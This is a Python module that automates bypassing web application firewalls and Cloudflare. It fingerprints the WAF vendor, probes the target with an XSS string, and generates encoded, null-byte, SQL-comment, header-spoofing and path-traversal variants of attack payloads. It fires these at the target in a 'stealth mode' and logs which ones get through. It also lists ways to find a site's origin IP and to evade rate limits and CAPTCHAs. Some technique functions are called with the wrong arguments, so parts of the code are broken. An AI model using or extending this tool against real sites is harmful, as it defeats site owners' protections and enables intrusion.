"""
WAF/Cloudflare Bypass Automation Module
Automated techniques to bypass Web Application Firewalls
"""
import asyncio
import aiohttp
import random
import string
import json
from typing import List, Dict, Any, Optional
from urllib.parse import quote, urlencode
import base64

class WAFBypasser:
    """Automated WAF and Cloudflare bypass techniques"""
    
    def __init__(self, target: str, stealth_mode: bool = False):
        self.target = target
        self.stealth_mode = stealth_mode
        self.findings: List[Dict] = []
        self.successful_bypasses: List[Dict] = []
        
        self.waf_signatures = {
            "cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-request-id"],
            "akamai": ["akamai", "ak_bmsc", "bm_sv"],
            "aws_waf": ["awswaf", "x-amzn-requestid"],
            "imperva": ["incap_ses", "visid_incap", "incapsula"],
            "f5_bigip": ["bigipserver", "f5_st", "f5-lbcookie"],
            "modsecurity": ["modsecurity", "mod_security"],
            "sucuri": ["sucuri", "x-sucuri-id"],
            "barracuda": ["barra_counter_session"],
            "fortiweb": ["fortiwafsid"],
            "wordfence": ["wordfence_", "wf_loginhash"]
        }
        
        self.bypass_techniques = {
            "encoding": self._encoding_bypasses,
            "case_variation": self._case_variation_bypasses,
            "null_bytes": self._null_byte_bypasses,
            "unicode": self._unicode_bypasses,
            "chunked": self._chunked_bypasses,
            "header_injection": self._header_injection_bypasses,
            "http_method": self._http_method_bypasses,
            "path_traversal": self._path_traversal_bypasses,
            "comment_injection": self._comment_injection_bypasses,
            "protocol_downgrade": self._protocol_downgrade_bypasses
        }
    
    async def detect_waf(self) -> Dict[str, Any]:
        """Detect which WAF is protecting the target"""
        detected = []
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(self.target, timeout=10) as response:
                    headers = dict(response.headers)
                    cookies = response.cookies
                    
                    for waf_name, signatures in self.waf_signatures.items():
                        for sig in signatures:
                            header_match = any(sig.lower() in h.lower() for h in headers.keys())
                            value_match = any(sig.lower() in str(v).lower() for v in headers.values())
                            cookie_match = any(sig.lower() in c.lower() for c in cookies.keys())
                            
                            if header_match or value_match or cookie_match:
                                detected.append(waf_name)
                                break
                
                malicious_test = f"{self.target}?test=<script>alert(1)</script>"
                async with session.get(malicious_test, timeout=10) as block_response:
                    if block_response.status in [403, 406, 429, 503]:
                        detected.append("generic_waf_blocking")
                
            except Exception as e:
                pass
        
        return {
            "target": self.target,
            "waf_detected": list(set(detected)),
            "is_protected": len(detected) > 0
        }
    
    def _encoding_bypasses(self, payload: str) -> List[str]:
        """Generate encoding-based bypasses"""
        bypasses = []
        
        bypasses.append(quote(payload))
        bypasses.append(quote(quote(payload)))
        bypasses.append(payload.replace(" ", "+"))
        bypasses.append(payload.replace(" ", "%20"))
        bypasses.append(payload.replace(" ", "%09"))
        bypasses.append(payload.replace(" ", "%0a"))
        bypasses.append(payload.replace(" ", "%0d"))
        bypasses.append(payload.replace(" ", "/**/"))
        
        hex_encoded = ''.join(f'%{ord(c):02x}' for c in payload)
        bypasses.append(hex_encoded)
        
        unicode_encoded = ''.join(f'%u{ord(c):04x}' for c in payload)
        bypasses.append(unicode_encoded)
        
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        bypasses.append(html_encoded)
        
        return bypasses
    
    def _case_variation_bypasses(self, payload: str) -> List[str]:
        """Generate case variation bypasses"""
        bypasses = []
        
        bypasses.append(payload.upper())
        bypasses.append(payload.lower())
        
        mixed = ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
        bypasses.append(mixed)
        
        random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        bypasses.append(random_case)
        
        return bypasses
    
    def _null_byte_bypasses(self, payload: str) -> List[str]:
        """Generate null byte injection bypasses"""
        return [
            f"%00{payload}",
            f"{payload}%00",
            f"{payload}%00.html",
            f"{payload}%00.jpg",
            payload.replace(" ", "%00"),
            f"\x00{payload}",
            f"{payload}\x00"
        ]
    
    def _unicode_bypasses(self, payload: str) -> List[str]:
        """Generate unicode-based bypasses"""
        bypasses = []
        
        replacements = {
            '<': ['%EF%BC%9C', '＜', '\u003c', '&lt;', '&#60;', '&#x3C;'],
            '>': ['%EF%BC%9E', '＞', '\u003e', '&gt;', '&#62;', '&#x3E;'],
            "'": ['%EF%BC%87', '＇', '`', '´', '′'],
            '"': ['%EF%BC%82', '＂', '"', '"', '″'],
            '/': ['%EF%BC%8F', '／', '⁄', '∕'],
            '\\': ['%EF%BC%BC', '＼', '⧵']
        }
        
        for char, alternatives in replacements.items():
            if char in payload:
                for alt in alternatives:
                    bypasses.append(payload.replace(char, alt))
        
        return bypasses
    
    def _chunked_bypasses(self, payload: str) -> List[str]:
        """Generate chunked/fragmented bypasses"""
        bypasses = []
        
        if len(payload) > 2:
            mid = len(payload) // 2
            bypasses.append(f"{payload[:mid]}/**/{payload[mid:]}")
            bypasses.append(f"{payload[:mid]}--{payload[mid:]}")
            bypasses.append(f"{payload[:mid]}#\n{payload[mid:]}")
        
        return bypasses
    
    def _header_injection_bypasses(self, payload: str) -> List[Dict]:
        """Generate header-based bypasses"""
        return [
            {"X-Originating-IP": "127.0.0.1", "payload": payload},
            {"X-Forwarded-For": "127.0.0.1", "payload": payload},
            {"X-Remote-IP": "127.0.0.1", "payload": payload},
            {"X-Remote-Addr": "127.0.0.1", "payload": payload},
            {"X-Client-IP": "127.0.0.1", "payload": payload},
            {"X-Real-IP": "127.0.0.1", "payload": payload},
            {"True-Client-IP": "127.0.0.1", "payload": payload},
            {"X-Forwarded-Host": "localhost", "payload": payload},
            {"Content-Type": "application/x-www-form-urlencoded; charset=ibm037", "payload": payload},
            {"Content-Type": "multipart/form-data; boundary=----", "payload": payload}
        ]
    
    def _http_method_bypasses(self) -> List[str]:
        """HTTP method override bypasses"""
        return [
            "X-HTTP-Method-Override: POST",
            "X-HTTP-Method: POST", 
            "X-Method-Override: POST",
            "_method=POST"
        ]
    
    def _path_traversal_bypasses(self, path: str) -> List[str]:
        """Path traversal bypasses"""
        return [
            f"/..;/{path}",
            f"/.;/{path}",
            f"/..%00/{path}",
            f"/%2e%2e/{path}",
            f"/%252e%252e/{path}",
            f"/..%5c{path}",
            f"/.%00/{path}",
            f"//{path}",
            f"/{path}//",
            f"/{path}%20",
            f"/{path}%09",
            f"/{path}..;",
            f"/{path}?ignored=1",
            f"/{path}#ignored"
        ]
    
    def _comment_injection_bypasses(self, payload: str) -> List[str]:
        """SQL/Code comment-based bypasses"""
        return [
            payload.replace(" ", "/**/"),
            payload.replace(" ", "/*!*/"),
            payload.replace(" ", "/*--*/"),
            payload.replace(" ", "/**_**/"),
            f"/*{random.randint(1000,9999)}*/{payload}",
            f"{payload}/*{random.randint(1000,9999)}*/",
            payload.replace("SELECT", "/*!50000SELECT*/"),
            payload.replace("UNION", "/*!50000UNION*/"),
            payload.replace("OR", "||"),
            payload.replace("AND", "&&")
        ]
    
    def _protocol_downgrade_bypasses(self) -> List[Dict]:
        """Protocol downgrade attack configs"""
        return [
            {"protocol": "HTTP/1.0", "description": "Downgrade to HTTP/1.0"},
            {"protocol": "HTTP/0.9", "description": "Downgrade to HTTP/0.9"},
            {"transfer_encoding": "chunked", "description": "Chunked transfer encoding"},
            {"transfer_encoding": "gzip, chunked", "description": "Mixed encoding"}
        ]
    
    async def test_bypass(self, payload: str, technique: str = "all") -> List[Dict]:
        """Test bypass techniques against WAF"""
        results = []
        
        techniques_to_test = self.bypass_techniques.keys() if technique == "all" else [technique]
        
        async with aiohttp.ClientSession() as session:
            for tech in techniques_to_test:
                if tech not in self.bypass_techniques:
                    continue
                
                bypass_payloads = self.bypass_techniques[tech](payload)
                
                if isinstance(bypass_payloads, list):
                    for bp in bypass_payloads:
                        if isinstance(bp, dict):
                            headers = {k: v for k, v in bp.items() if k != "payload"}
                            test_payload = bp.get("payload", payload)
                        else:
                            headers = {}
                            test_payload = bp
                        
                        success = await self._test_payload(session, test_payload, headers)
                        
                        if success:
                            result = {
                                "technique": tech,
                                "original_payload": payload,
                                "bypass_payload": test_payload,
                                "headers": headers,
                                "success": True
                            }
                            results.append(result)
                            self.successful_bypasses.append(result)
                        
                        if self.stealth_mode:
                            await asyncio.sleep(0.5)
        
        return results
    
    async def _test_payload(self, session: aiohttp.ClientSession, payload: str, extra_headers: Dict = None) -> bool:
        """Test if payload bypasses WAF"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            **(extra_headers or {})
        }
        
        try:
            test_url = f"{self.target}?test={quote(payload)}"
            
            async with session.get(test_url, headers=headers, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if payload in content or "blocked" not in content.lower():
                        return True
                        
            return False
            
        except Exception:
            return False
    
    def generate_all_bypasses(self, payload: str) -> Dict[str, List]:
        """Generate all bypass variations for a payload"""
        all_bypasses = {}
        
        for technique, func in self.bypass_techniques.items():
            try:
                bypasses = func(payload)
                all_bypasses[technique] = bypasses
            except Exception:
                all_bypasses[technique] = []
        
        return all_bypasses
    
    async def cloudflare_bypass(self) -> Dict[str, Any]:
        """Specific Cloudflare bypass techniques"""
        bypass_methods = []
        
        origin_ip_methods = [
            "Check historical DNS records",
            "Search Shodan for SSL certificate",
            "Check subdomains for origin leak",
            "Search Censys for origin IP",
            "Check email headers from target domain"
        ]
        bypass_methods.extend(origin_ip_methods)
        
        bypass_headers = [
            {"CF-Connecting-IP": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1, 1.1.1.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"}
        ]
        
        return {
            "target": self.target,
            "bypass_strategies": {
                "origin_ip_discovery": origin_ip_methods,
                "header_spoofing": bypass_headers,
                "rate_limit_bypass": [
                    "Rotate IP addresses via proxy",
                    "Use different user agents",
                    "Implement request delays",
                    "Use residential proxies"
                ],
                "captcha_bypass": [
                    "Use headless browser with stealth",
                    "Implement CAPTCHA solving service",
                    "Use browser fingerprint rotation"
                ]
            }
        }
    
    def get_report(self) -> Dict:
        """Generate WAF bypass report"""
        return {
            "target": self.target,
            "successful_bypasses": len(self.successful_bypasses),
            "bypasses": self.successful_bypasses,
            "techniques_tested": list(self.bypass_techniques.keys())
        }
